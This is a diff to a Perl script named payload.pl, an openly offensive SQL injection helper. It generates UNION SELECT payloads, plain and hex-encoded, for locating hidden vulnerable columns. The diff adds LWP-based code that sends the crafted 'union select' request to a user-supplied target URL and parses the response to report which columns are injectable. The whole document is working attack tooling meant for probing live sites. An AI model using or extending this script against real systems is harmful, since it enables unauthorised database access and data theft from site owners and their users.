@@ -2,7 +2,7 @@
 
 																																
 #	What does this script : This script will help you with SQli that hide the vulnerable column in the source.                  
-#	Developper : Crown - 05/09/13 (dd/mm/aa)																								
+#	Developper : Crown - 05/09/13 ()																								
 #	Usage : ./payload.pl <number of column> <size of column name>																
 # 																																
 #	Exemple : ./payload.pl 5 6                                                                                                  
@@ -13,7 +13,7 @@
 
 use strict;
 use warnings;
-
+use LWP::Simple;
 
 if(defined($ARGV[0]) == 0 || defined($ARGV[1]) == 0) 
 {
@@ -46,6 +46,28 @@ for(my $p = 1; $p <= $number_column; $p++)
 
 ($column,$column_hex) = (join(",",@columns),join(",",@columns_hex));
 
-print "Payload with $number_column column(s) ($length_column_string chars) : $column\n";
-print "Payload (hex mode) with $number_column column(s) ($length_column_string chars) : $column_hex\n";
+print "Payload with $number_column column(s) ($length_column_string chars) : $column\n\n";
+print "Payload (hex mode) with $number_column column(s) ($length_column_string chars) : $column_hex\n\n";
+
+if(defined($ARGV[2]) == 1 && defined($ARGV[3]) == 1)
+{
+	my $link = $ARGV[2]." union select $column_hex".$ARGV[3];
+	my $source =  get($link);
+	my $z = 1;
+
+	print "Full URL :==> $link\n\n";
+	
+	foreach my $x (@columns) 
+	{
+		$x =~ s/'//g;
+	
+		if($source =~ /$x/)
+		{
+			print "Vulnerable column : ($z) with payload : $x\n";
+		}
+	
+		$z++;
+	}
+}
+
 
